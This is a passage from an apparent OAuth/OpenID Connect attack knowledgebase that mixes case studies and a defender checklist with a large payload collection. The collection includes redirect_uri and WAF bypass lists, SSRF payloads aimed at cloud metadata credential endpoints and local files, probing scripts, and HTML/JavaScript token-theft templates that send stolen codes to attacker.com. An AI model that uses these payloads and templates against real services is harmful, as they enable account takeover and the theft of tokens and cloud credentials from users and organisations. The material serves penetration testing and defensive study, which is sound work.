| Attribute | Protection |
|-----------|-----------|
| `HttpOnly` | Prevents JavaScript access |
| `Secure` | HTTPS-only transmission |
| `SameSite=Strict` | CSRF protection |

### iframe Sandboxing

```html
<iframe sandbox="allow-scripts allow-same-origin" src="...">
```

Sandboxed iframes can still access fragments and postMessage. `allow-same-origin` is required for same-origin access.

---

## Gadget Chains

### OAuth + XSS Gadget Chain

```
1. Attacker finds XSS on callback page (but it is useless alone - no session cookies accessible)
2. Attacker chains XSS with OAuth redirect_uri traversal
3. OAuth redirects to XSS endpoint with token in URL
4. XSS extracts token from URL
5. Attacker now has persistent access (token does not expire when tab closes)
```

**Impact escalation**: Reflected XSS --> Account takeover (via stolen OAuth token)

### OAuth + HTML Injection Gadget Chain

```
1. Attacker finds HTML injection on callback page
2. Injects: <img src='https://attacker.com/log'>
3. Browser loads image, sends Referer with full URL including code
4. Code leaked to attacker's server
```

### OAuth + Prototype Pollution Gadget Chain

```
1. Attacker finds prototype pollution in client application
2. Pollutes Object.prototype to modify OAuth configuration
3. redirect_uri gets changed to attacker's domain
4. All subsequent OAuth flows leak tokens
```

Example payload:
```
?__proto__[redirect_uri]=https://attacker.com
```

### OAuth + postMessage Gadget Chain

```
1. Attacker finds insecure postMessage listener on callback page
2. Listener sends URL (with token fragment) to parent
3. Attacker embeds callback in iframe on attacker's page
4. Receives token via postMessage
```

### OAuth + Open Redirect Gadget Chain

See [Open Redirect + OAuth Chains](#open-redirect--oauth-chains).

### OAuth + CORS Misconfiguration Gadget Chain

```
1. OAuth callback endpoint has CORS: Access-Control-Allow-Origin: *
2. Attacker's JavaScript can read callback response
3. Attacker initiates OAuth flow via XHR/fetch
4. Reads authorization code from response
```

---

## Real World Case Studies

### Booking.com Open Redirect (2023)

**Discovered by**: Salt Labs
**Impact**: Full account takeover
**Mechanism**: Attackers registered redirect URIs with wildcards/pattern matching. Crafted malicious authorization requests passed validation but redirected to attacker infrastructure.

**Key lesson**: Exact string matching on redirect URIs is critical. No wildcards, no patterns, no partial matching.

### Facebook OAuth Redirect URI Bypass (Historical)

**Mechanism**: Facebook's redirect_uri validation allowed subdomain wildcards. Attackers could register `https://attacker.facebook.com` and steal tokens.

### Google OAuth Domain Inheritance

**Mechanism**: Google's OAuth allowed redirect URIs on any subdomain of verified domains. Attackers could exploit subdomain takeover on any verified domain.

### Microsoft Consent Phishing (2022)

**Mechanism**: Attackers impersonated legitimate partners, created OAuth apps in Microsoft Cloud Partner Program. Users approved apps, granting attackers persistent access to email data.

**Impact**: No passwords stolen, no MFA bypass needed. Access was legitimate by design.

### Salesloft-Drift Breach (2025)

**Mechanism**: Compromised GitHub --> Exploited Drift integration OAuth tokens --> Accessed Salesforce instances at 700+ organizations.

**Key lesson**: Third-party OAuth integrations create supply chain risk.

### Allianz Life Salesforce Compromise

**Impact**: 1.1 million customer records exposed
**Mechanism**: OAuth token abuse in SaaS integration

### GitLab Pages Service Worker Token Theft

**Mechanism**: Service Worker intercepted `/auth` endpoint requests, stealing session tokens from GitLab Pages.

---

## Fuzzing Payloads

### redirect_uri Fuzzing Wordlist

```
https://evil.com
http://evil.com
//evil.com
\\evil.com
https:evil.com
http:evil.com
javascript:alert(1)
data:text/html,<script>alert(1)</script>
file:///etc/passwd
ftp://evil.com
https://localhost
http://127.0.0.1
http://[::1]
http://0177.0.0.1
http://0x7f.0.0.1
https://2130706433
https://0x7f000001
https://victim.com@evil.com
https://victim.com.evil.com
https://evil.com/victim.com
https://victim.com?evil.com
https://victim.com#evil.com
https://victim.com%5c@evil.com
https://victim.com%00@evil.com
https://victim.com%E3%80%82evil.com
https://victim.com%2e%2e%2f
https://victim.com/../
https://victim.com/../../
https://victim.com/..%2f/
https://victim.com/%2e%2e/
https://victim.com/%252e%252e/
https://victim.com/..%00/
https://victim.com/..%0d/
https://victim.com/..%5c/
https://victim.com/..\\
https://victim.com/.../
https://victim.com/....\
https://victim.com/..;/
https://victim.com/.;/
https://victim.com%2f..
https://victim.com%2f%2e%2e
https://victim.com//../
https://victim.com/\../
https://victim.com/%5c../
https://victim.com/.%00./
https://victim.com/%20../
https://victim.com/..%20/
https://victim.com/..%09/
https://victim.com/..%00/
https://victim.com/..%ff/
https://victim.com/%c0%ae%c0%ae/
https://victim.com/%ef%bc%8e%ef%bc%8e/
```

### OAuth Parameter Fuzzing

```
# response_type fuzzing
code
token
id_token
code token
code id_token
token id_token
code token id_token
none

# response_mode fuzzing
query
fragment
form_post
web_message

# scope fuzzing
openid
profile
email
openid profile
openid email
openid profile email
admin
*

# grant_type fuzzing
authorization_code
implicit
password
client_credentials
device_code
refresh_token

# state fuzzing
(empty)
null
undefined
<script>alert(1)</script>

# nonce fuzzing
(empty)
null
<script>alert(1)</script>
```

### SSRF Payloads for Dynamic Registration

```
# AWS Metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/
http://169.254.169.254/latest/user-data

# GCP Metadata
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure Metadata
http://169.254.169.254/metadata/instance?api-version=2017-12-01

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/

# Internal services
http://localhost:22/
http://localhost:80/
http://localhost:443/
http://localhost:8080/
http://127.0.0.1:80/
http://[::1]:80/

# File access
file:///etc/passwd
file:///proc/self/environ
file:///windows/win.ini

# Alternative protocols
dict://localhost:11211/
gopher://localhost:9000/
ftp://localhost:21/
```

---

## Automation Workflows

### OAuth Recon Automation

```bash
#!/bin/bash
# OAuth recon workflow

TARGET=$1

# 1. Discovery endpoints
curl -s "https://$TARGET/.well-known/openid-configuration" | jq .
curl -s "https://$TARGET/.well-known/oauth-authorization-server" | jq .

# 2. Check for dynamic registration
curl -s -X POST "https://$TARGET/reg" -H "Content-Type: application/json" -d '''{"redirect_uris":["https://evil.com"]}'''

# 3. Check for request_uri support
curl -s "https://$TARGET/auth?client_id=test&request_uri=https://evil.com/test.jwt"

# 4. Check for webfinger
curl -s "https://$TARGET/.well-known/webfinger?resource=http://x/test&rel=http://openid.net/specs/connect/1.0/issuer"
```

### redirect_uri Bypass Automation (Python)

```python
#!/usr/bin/env python3
import requests
import urllib.parse

TARGET = "https://victim.com"
CLIENT_ID = "discovered_client_id"

payloads = [
    "https://evil.com",
    "https://victim.com@evil.com",
    "https://victim.com.evil.com",
    "https://victim.com/callback/../admin",
    "https://victim.com/callback/%2e%2e%2fprofile",
    "https://localhost.evil.com",
    "javascript:alert(1)",
]

for payload in payloads:
    url = f"{TARGET}/auth?client_id={CLIENT_ID}&redirect_uri={urllib.parse.quote(payload)}&response_type=code&scope=openid"
    r = requests.get(url, allow_redirects=False)
    if r.status_code == 302:
        location = r.headers.get('Location', '')
        print(f"[+] Payload worked: {payload}")
        print(f"    Redirect: {location}")
```

### Token Theft Automation

```python
#!/usr/bin/env python3
import requests
import re

def steal_token_via_referer(callback_url, attacker_url):
    """If callback page loads external resources, token leaks via Referer"""
    # Host page with image pointing to attacker
    html = f'<img src="{attacker_url}/log">'
    # When callback loads this, Referer contains token

def steal_token_via_fragment(redirect_uri):
    """Extract token from URL fragment"""
    # In browser context:
    # token = document.location.hash.split('=')[1]
    pass
```

### Nuclei Scanning Workflow

```bash
# Update templates
nuclei -update-templates

# OAuth-specific scan
nuclei -l targets.txt -t http/vulnerabilities/oauth/ -o oauth_results.txt

# Full scan with OAuth focus
nuclei -l targets.txt \
  -t http/vulnerabilities/oauth/ \
  -t http/exposures/apis/ \
  -t http/exposures/configs/ \
  -o full_oauth_scan.txt \
  -stats
```

---

## Recon Methodology

### Phase 1: Identify OAuth Usage

1. Look for 'Login with...' buttons
2. Proxy traffic and watch for `/auth`, `/authorize`, `/token` endpoints
3. Check for `client_id`, `redirect_uri`, `response_type` parameters
4. Identify OAuth provider (Google, Facebook, GitHub, custom, etc.)

### Phase 2: Discovery

```
GET /.well-known/openid-configuration
GET /.well-known/oauth-authorization-server
GET /.well-known/webfinger?resource=acct:user@domain&rel=http://openid.net/specs/connect/1.0/issuer
```

Analyze response for:
- Supported grant types
- Registration endpoint
- Request URI support
- JWKS URI
- Supported scopes
- Response modes

### Phase 3: Endpoint Enumeration

```
/auth or /authorize        # Authorization endpoint
/token                     # Token endpoint
/userinfo                  # User info endpoint
/introspect                # Token introspection
/revoke                    # Token revocation
/reg or /register          # Dynamic client registration
/end-session               # Logout endpoint
/jwks                      # JSON Web Key Set
```

### Phase 4: Parameter Analysis

Test each parameter for:
- Missing validation
- Parser confusion
- Injection vulnerabilities
- Information disclosure

### Phase 5: Flow Analysis

Trace complete OAuth flow:
1. Authorization request
2. Login/consent
3. Callback
4. Token exchange
5. Resource access

Look for:
- Missing state parameter
- Missing PKCE
- Token in URL
- Sensitive data in logs
- Weak redirect_uri validation

### Phase 6: Client Application Testing

Test client-side implementation:
- How is token stored? (localStorage, cookie, memory)
- Is token validated against user identity?
- Can token be replayed?
- Are there XSS vulnerabilities on callback pages?
- Is postMessage used securely?

### Phase 7: Chaining

Combine findings:
- redirect_uri bypass + XSS
- redirect_uri bypass + open redirect
- Dynamic registration + SSRF
- postMessage + OAuth
- Cache poisoning + OAuth
- Request smuggling + OAuth

---

## Nuclei Templates

### Template: OAuth Discovery Endpoint

```yaml
id: oauth-openid-config

info:
  name: OAuth OpenID Configuration Exposure
  author: yourname
  severity: info
  description: Detects exposed OpenID Connect configuration
  tags: oauth,openid,config,exposure

requests:
  - method: GET
    path:
      - "{{BaseURL}}/.well-known/openid-configuration"
      - "{{BaseURL}}/.well-known/oauth-authorization-server"

    matchers:
      - type: word
        words:
          - "authorization_endpoint"
          - "token_endpoint"
          - "issuer"
        condition: or
```

### Template: OAuth redirect_uri Validation Bypass

```yaml
id: oauth-redirect-uri-bypass

info:
  name: OAuth redirect_uri Validation Bypass
  author: yourname
  severity: critical
  description: Tests for weak redirect_uri validation
  tags: oauth,redirect-uri,bypass

requests:
  - method: GET
    path:
      - "{{BaseURL}}/auth?client_id={{client_id}}&redirect_uri=https://evil.com&response_type=code"
      - "{{BaseURL}}/authorize?client_id={{client_id}}&redirect_uri=https://evil.com&response_type=code"

    matchers:
      - type: status
        status:
          - 302
      - type: word
        words:
          - "evil.com"
        part: header
        condition: and
```

### Template: Dynamic Client Registration SSRF

```yaml
id: oauth-dynamic-registration-ssrf

info:
  name: OAuth Dynamic Client Registration SSRF
  author: yourname
  severity: high
  description: Tests for SSRF via dynamic client registration
  tags: oauth,ssrf,dynamic-registration

requests:
  - method: POST
    path:
      - "{{BaseURL}}/reg"
      - "{{BaseURL}}/register"
      - "{{BaseURL}}/connect/register"
    headers:
      Content-Type: application/json
    body: |
      {
        "redirect_uris": ["https://example.com"],
        "logo_uri": "https://{{interactsh-url}}"
      }

    matchers:
      - type: word
        words:
          - "client_id"
        part: body
```

### Template: Missing State Parameter

```yaml
id: oauth-missing-state

info:
  name: OAuth Missing State Parameter
  author: yourname
  severity: medium
  description: Detects OAuth flows without state parameter
  tags: oauth,csrf,state

requests:
  - method: GET
    path:
      - "{{BaseURL}}/auth?client_id={{client_id}}&redirect_uri={{redirect_uri}}&response_type=code&scope=openid"

    matchers:
      - type: word
        words:
          - "state"
        part: body
        negative: true
```

### Template: Implicit Flow Detection

```yaml
id: oauth-implicit-flow

info:
  name: OAuth Implicit Flow Usage
  author: yourname
  severity: medium
  description: Detects usage of deprecated implicit flow
  tags: oauth,implicit,deprecated

requests:
  - method: GET
    path:
      - "{{BaseURL}}/auth?client_id={{client_id}}&redirect_uri={{redirect_uri}}&response_type=token"

    matchers:
      - type: status
        status:
          - 302
      - type: word
        words:
          - "access_token"
        part: header
        negative: true
```

---

## Tools and Scanners

### Burp Suite Extensions

| Extension | Purpose |
|-----------|---------|
| **HTTP Request Smuggler** | Detect desync vulnerabilities |
| **Param Miner** | Discover hidden parameters |
| **DOM Invader** | Find DOM-based vulnerabilities including postMessage |
| **Autorize** | Test authorization bypasses |
| **Logger++** | Enhanced logging |

### OAuth-Specific Tools

| Tool | Purpose |
|------|---------|
| **postMessage-tracker** | Chrome extension for tracking postMessage usage |
| **CursedChrome** | Chrome extension exploitation framework |
| **pp-finder** | Find prototype pollution vulnerabilities |

### Recon Tools

| Tool | Purpose |
|------|---------|
| **Nuclei** | Vulnerability scanner with OAuth templates |
| **httpx** | Fast HTTP prober |
| **katana** | Web crawler |
| **subfinder** | Subdomain discovery |
| **interactsh** | Out-of-band interaction server |

### Request Smuggling Tools

| Tool | Purpose |
|------|---------|
| **HTTP Request Smuggler** | Burp extension for desync detection |
| **smuggler.py** | CLI desync scanner |
| **defparam/smuggler** | Alternative smuggling tool |

### Manual Testing Tools

```bash
# curl for OAuth testing
curl -v "https://target.com/auth?client_id=ID&redirect_uri=URI&response_type=code"

# Burp Collaborator for out-of-band testing
# Use for: SSRF via logo_uri, request_uri, etc.

# Browser DevTools
# Monitor: Network tab, Application tab (localStorage, cookies), Console (postMessage)
```

---

## Advanced Research

### Hidden OAuth Attack Vectors (PortSwigger Research)

#### 1. Dynamic Client Registration SSRF

OAuth registration endpoints accept URI parameters that may be fetched server-side. This is second-order SSRF - the URL is stored during registration and fetched later during authorization flow.

**Key parameters for SSRF**:
- `logo_uri` - Fetched when displaying client info
- `jwks_uri` - Fetched when validating JWT assertions
- `sector_identifier_uri` - Fetched for redirect URI validation
- `request_uris` - Fetched during authorization

#### 2. redirect_uri Session Poisoning

When OAuth servers store authorization parameters in session rather than carrying them through the flow:

```
1. Attacker sends authorization request with trusted client_id
2. In background, attacker sends authorization request with attacker's client_id + redirect_uri
3. Session gets poisoned with attacker's redirect_uri
4. User approves first request (trusted client)
5. Token sent to attacker's redirect_uri
```

**Caveat**: Requires user to approve the trusted client. Use `prompt=consent` to force consent screen.

#### 3. WebFinger User Enumeration

```
GET /.well-known/webfinger?resource=http://x/anonymous&rel=http://openid.net/specs/connect/1.0/issuer
```

Response reveals whether user exists and issuer information. Can be used for:
- User enumeration
- Internal endpoint discovery
- OpenID configuration mapping

### CVE-2021-26715: MITREid Connect SSRF

- **Vector**: `logo_uri` in dynamic client registration
- **Impact**: SSRF + XSS
- **Root cause**: Server fetches `logo_uri` without validation, returns content without checking Content-Type

### CVE-2021-27582: MITREid Connect redirect_uri Bypass

- **Vector**: Spring `@ModelAttribute` mass assignment on `/oauth/confirm_access`
- **Impact**: redirect_uri bypass without session poisoning
- **Root cause**: Parameters from URL bind to model, overriding session values

### RFC 9700 Security Best Practices (2025)

Key updates:
- **Exact redirect_uri matching** required (no wildcards)
- **PKCE mandatory** for all public clients
- **Implicit flow deprecated**
- **ROPC flow deprecated**
- **State parameter strongly recommended**

### Browser-Powered Desync Attacks

Modern desync attacks use the browser as the attack delivery mechanism:

```javascript
fetch('https://victim.com', {
    method: 'POST',
    body: 'SMUGGLED_REQUEST',
    credentials: 'include'
});
```

**OAuth application**: Poison OAuth token exchange by smuggling requests.

### Web Cache Entanglement

When cache key calculation differs from application routing:

```
1. Attacker requests: /callback?code=CODE&state=<script>alert(1)</script>
2. Cache stores response with key: /callback?code=CODE (state stripped)
3. Victim requests: /callback?code=CODE
4. Receives poisoned XSS response
```

---

## Bug Bounty Writeups

### Writeup 1: OAuth Account Hijacking via redirect_uri

**Researcher**: Ryan G. Cox
**Platform**: PortSwigger Labs
**Summary**: Misconfigured redirect_uri validation allowed arbitrary domains. Attacker crafted OAuth URL with attacker-controlled redirect_uri, victim's browser sent authorization code to attacker.

**Payload**:
```html
<iframe src="https://oauth-server.com/auth?client_id=ID&redirect_uri=https://attacker.com&response_type=code&scope=openid%20profile%20email"></iframe>
```

### Writeup 2: Stealing OAuth Access Tokens via Open Redirect

**Researcher**: Multiple
**Platform**: PortSwigger Labs
**Summary**: Chained directory traversal in redirect_uri with open redirect to leak implicit flow tokens.

**Chain**:
```
redirect_uri=/callback/../post/next?path=https://attacker.com
--> Open redirect preserves fragment
--> Token leaked to attacker.com#access_token=TOKEN
```

### Writeup 3: Forced OAuth Profile Linking

**Researcher**: Multiple
**Platform**: PortSwigger Labs
**Summary**: Missing state parameter in OAuth linking flow allowed CSRF. Attacker captured linking code, delivered to admin via iframe, admin's account linked to attacker's social profile.

**Key**: Code is single-use but attacker controls timing by dropping their own request.

### Writeup 4: Authentication Bypass via OAuth Implicit Flow

**Researcher**: Multiple
**Platform**: PortSwigger Labs
**Summary**: Client application trusted user data sent with token without verification. Attacker changed email/username in POST to `/authenticate` to impersonate any user.

**Payload**:
```json
{
    "email": "victim@example.com",
    "username": "victim",
    "token": "ATTACKER_VALID_TOKEN"
}
```

### Writeup 5: SSRF via OpenID Dynamic Client Registration

**Researcher**: PortSwigger Research
**Platform**: PortSwigger Labs
**Summary**: Unprotected dynamic registration endpoint allowed registering clients with arbitrary `logo_uri`. Fetching `/client/{id}/logo` triggered SSRF to internal metadata services.

**Payload**:
```json
{
    "redirect_uris": ["https://example.com"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

---

## Payload Collections

### Complete redirect_uri Bypass Payloads

```
# Basic external redirect
https://evil.com
http://evil.com

# Subdomain variations
https://evil.victim.com
https://victim.com.evil.com
https://evilcom/victim.com

# URL parser confusion
https://victim.com@evil.com
https://victim.com%5c@evil.com
https://victim.com%00@evil.com
https://victim.com%E3%80%82evil.com
https://victim.com.evil.com
https://victim.com?evil.com
https://victim.com#evil.com

# Path traversal
https://victim.com/callback/../admin
https://victim.com/callback/../../etc/passwd
https://victim.com/callback/%2e%2e%2fprofile
https://victim.com/callback/%252e%252e%2fprofile
https://victim.com/callback/..%00/..%00/admin

# localhost abuse
http://localhost/callback
http://127.0.0.1:8080/callback
http://localhost.evil.com/callback

# Scheme abuse
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
file:///etc/passwd

# Unicode/IDN
https://victim-аpp.com  # Cyrillic a
https://victim.com.xn--e1afmkfd.com

# Parameter pollution
https://victim.com/callback?redirect_uri=https://evil.com
```

### OAuth SSRF Payloads (Dynamic Registration)

```
# AWS Metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/
http://169.254.169.254/latest/user-data

# GCP Metadata
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure Metadata
http://169.254.169.254/metadata/instance?api-version=2017-12-01

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/

# Internal services
http://localhost:22/
http://localhost:80/
http://localhost:443/
http://localhost:8080/
http://127.0.0.1:80/
http://[::1]:80/

# File access
file:///etc/passwd
file:///proc/self/environ
file:///windows/win.ini

# Alternative protocols
dict://localhost:11211/
gopher://localhost:9000/
ftp://localhost:21/
```

### Token Theft Exploit Templates

```html
<!-- Basic iframe token theft -->
<iframe src="https://oauth-server.com/auth?client_id=ID&redirect_uri=https://attacker.com/steal&response_type=token&scope=openid%20profile%20email"></iframe>

<!-- Two-stage open redirect chain -->
<script>
if (!document.location.hash) {
    window.location = 'https://oauth-server.com/auth?client_id=ID&redirect_uri=https://victim.com/callback/../redirect?url=https://attacker.com/exploit/&response_type=token&scope=openid';
} else {
    window.location = '/?'+document.location.hash.substr(1);
}
</script>

<!-- postMessage token theft -->
<iframe src="https://oauth-server.com/auth?client_id=ID&redirect_uri=https://victim.com/callback/../post/comment-form&response_type=token&scope=openid" style="display:none;"></iframe>
<script>
window.addEventListener('message', function(e) {
    fetch("/" + encodeURIComponent(e.data.data));
}, false);
</script>

<!-- Service Worker token interception -->
<script>
navigator.serviceWorker.register('/sw.js').then(() => {
    console.log('SW registered - can intercept OAuth flows');
});
</script>

<!-- XSS on callback page -->
<script>
// Extract token from URL
var token = new URLSearchParams(window.location.search).get('code');
fetch('https://attacker.com/steal?token=' + token);
</script>

<!-- HTML injection + Referer theft -->
<img src="https://attacker.com/log">
<!-- When callback loads this, Referer contains full URL with code -->

<!-- Meta refresh token theft -->
<meta http-equiv="refresh" content="0;url=https://attacker.com/?token=CODE">
```

---

## WAF Bypasses

### redirect_uri WAF Bypass Techniques

```
# Case variation
ReDiReCt_Uri=https://evil.com
redirect_uri=HtTpS://evil.com

# Double encoding
redirect_uri=%25%32%35%25%32%35%25%32%66%25%32%65%25%32%65%25%32%66evil.com

# Unicode normalization
redirect_uri=https://evil%E3%80%82com
redirect_uri=https://evil%EF%BC%8Ecom

# Null byte injection
redirect_uri=https://evil%00.com

# Tab/newline injection
redirect_uri=https://evil%09.com
redirect_uri=https://evil%0a.com
redirect_uri=https://evil%0d.com

# Path traversal with encoding
redirect_uri=https://victim.com/%2e%2e/%2e%2e/evil.com
redirect_uri=https://victim.com/%252e%252e/%252e%252e/evil.com

# Alternative schemes
redirect_uri=//evil.com
redirect_uri=\evil.com
redirect_uri=https://evil.com%23victim.com
```

### Parameter Name Obfuscation

```
# Some WAFs only check specific parameter names
redirect_uri[] = https://evil.com
redirect_uri[0] = https://evil.com
redirect_url = https://evil.com
redirect = https://evil.com
callback = https://evil.com
oauth_callback = https://evil.com
```

### JSON-based WAF Bypass

```
# Some WAFs only check query parameters, not JSON body
POST /register HTTP/1.1
Content-Type: application/json

{
    "redirect_uris": ["https://evil.com"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/"
}
```

### Content-Type Bypass

```
# WAF may not inspect all content types
Content-Type: application/x-www-form-urlencoded
Content-Type: multipart/form-data
Content-Type: text/plain
```

---

## Detection Techniques

### OAuth Vulnerability Detection Checklist

#### Authorization Endpoint

- [ ] Missing `state` parameter
- [ ] Weak `redirect_uri` validation (prefix match, not exact)
- [ ] Wildcard/subdomain allowed in `redirect_uri`
- [ ] `response_mode=web_message` allows weaker validation
- [ ] `request_uri` parameter supported without registration
- [ ] `prompt=none` bypasses consent screen
- [ ] `login_hint` allows user enumeration

#### Token Endpoint

- [ ] Missing PKCE validation
- [ ] Code reuse allowed
- [ ] `client_secret` sent in URL (not body)
- [ ] Weak client authentication
- [ ] Token endpoint accessible without proper client credentials

#### Client Application

- [ ] Token stored in localStorage/sessionStorage
- [ ] Token not validated against user identity
- [ ] Implicit flow still used
- [ ] Missing CSRF protection on linking endpoints
- [ ] XSS on callback pages
- [ ] Insecure postMessage listeners
- [ ] CORS misconfiguration on callback endpoints

#### Dynamic Registration

- [ ] Registration endpoint unprotected
- [ ] `logo_uri` allows arbitrary URLs
- [ ] `jwks_uri` allows arbitrary URLs
- [ ] `sector_identifier_uri` allows arbitrary URLs
- [ ] `request_uris` allows arbitrary URLs

### Log Analysis for OAuth Attacks

```
# Look for suspicious redirect_uri patterns in logs
grep -i 'redirect_uri' access.log | grep -E '(evil|localhost|127\.0\.0\.1|169\.254)'

# Check for multiple authorization attempts from same IP
grep '/authorize' access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20

# Detect token theft attempts via Referer
grep 'Referer:.*access_token' access.log
```

### Behavioral Detection

- Unusual redirect_uri patterns (subdomains, IP addresses, foreign domains)
- Multiple failed authorization attempts followed by success
- Authorization requests without state parameter
- Token endpoint requests from unexpected IPs
- Rapid sequential requests to /authorize (brute force)

---

## References

### Official Specifications

- [RFC 6749 - The OAuth 2.0 Authorization Framework](https://datatracker.ietf.org/doc/html/rfc6749)
- [RFC 7636 - Proof Key for Code Exchange (PKCE)](https://datatracker.ietf.org/doc/html/rfc7636)
- [RFC 9700 - OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/rfc9700)
- [OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html)
- [OpenID Connect Dynamic Client Registration](https://openid.net/specs/openid-connect-registration-1_0.html)

### PortSwigger Research

- [OAuth 2.0 Authentication Vulnerabilities](https://portswigger.net/web-security/oauth)
- [Hidden OAuth Attack Vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [Browser-Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- [Web Cache Entanglement](https://portswigger.net/research/web-cache-entanglement)
- [Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [HTTP Desync Attacks: Request Smuggling Reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)

### GitHub Resources

- [PayloadsAllTheThings - OAuth](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth)
- [PayloadsAllTheThings - OAuth README](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/OAuth/README.md)
- [OAuth Payload List](https://github.com/payloadbox/oauth-payload-list)
- [Bug Bounty - OAuth](https://github.com/0xspade/bugbounty/tree/master/oauth)
- [Nuclei Templates - OAuth](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/oauth)
- [postMessage-tracker](https://github.com/fransr/postMessage-tracker)
- [Client-Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution)
- [pp-finder](https://github.com/yeswehack/pp-finder)

### Tools

- [Nuclei](https://github.com/projectdiscovery/nuclei)
- [httpx](https://github.com/projectdiscovery/httpx)
- [katana](https://github.com/projectdiscovery/katana)
- [subfinder](https://github.com/projectdiscovery/subfinder)
- [interactsh](https://github.com/projectdiscovery/interactsh)
- [Param Miner](https://github.com/PortSwigger/param-miner)
- [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [smuggler](https://github.com/defparam/smuggler)
- [CursedChrome](https://github.com/mandatoryprogrammer/CursedChrome)

### Educational Resources

- [HackTricks - OAuth to Account Takeover](https://book.hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html)
- [MDN - Authorization Header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization)
- [MDN - Window.postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
- [OAuth Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_CheatSheet.html)

### Real-World Case Studies

- [Booking.com OAuth Account Takeover](https://salt.security/blog/booking-com-oauth-account-takeover)
- [Microsoft Consent Phishing](https://www.microsoft.com/security/blog/2022/03/22/devious-phishing-attack-uses-malicious-oauth-applications/)
- [Salesloft-Drift Breach](https://www.bleepingcomputer.com/news/security/salesforce-data-breach-impacts-700-plus-organizations/)

---

## Appendix: Quick Reference Card

### OAuth Attack Matrix

| Attack Type | Prerequisites | Impact | Difficulty |
|-------------|--------------|--------|------------|
| redirect_uri bypass | Weak validation | Account takeover | Easy |
| Forced profile linking | Missing state | Account takeover | Medium |
| Token theft | Open redirect + OAuth | Data theft | Medium |
| Implicit flow bypass | No identity verification | Account takeover | Easy |
| Dynamic reg SSRF | Unprotected /reg | RCE / Data exfil | Hard |
| postMessage theft | Insecure listener | Token theft | Medium |
| Cache poisoning | Cache misconfig | Mass XSS | Hard |
| Request smuggling | Desync vulnerability | Session hijack | Hard |
| Service Worker | XSS prerequisite | Persistent theft | Hard |

### OAuth Security Checklist for Defenders

- [ ] Use exact string matching for redirect_uri (no wildcards, no prefix matching)
- [ ] Enforce PKCE for all public clients
- [ ] Deprecate implicit flow and ROPC
- [ ] Validate state parameter on all flows
- [ ] Bind authorization codes to client_id and redirect_uri
- [ ] Use short-lived authorization codes (max 10 minutes)
- [ ] Implement proper token storage (HttpOnly cookies, not localStorage)
- [ ] Validate token against user identity on /authenticate
- [ ] Protect dynamic registration endpoints
- [ ] Validate all URI parameters in registration
- [ ] Implement proper CORS on callback endpoints
- [ ] Use secure postMessage with origin validation
- [ ] Monitor for suspicious redirect_uri patterns
- [ ] Implement rate limiting on authorization endpoint

---

> **End of Knowledgebase**
> This document is a living resource. Update it as new attack vectors are discovered.
> Last updated: 2026-05-24
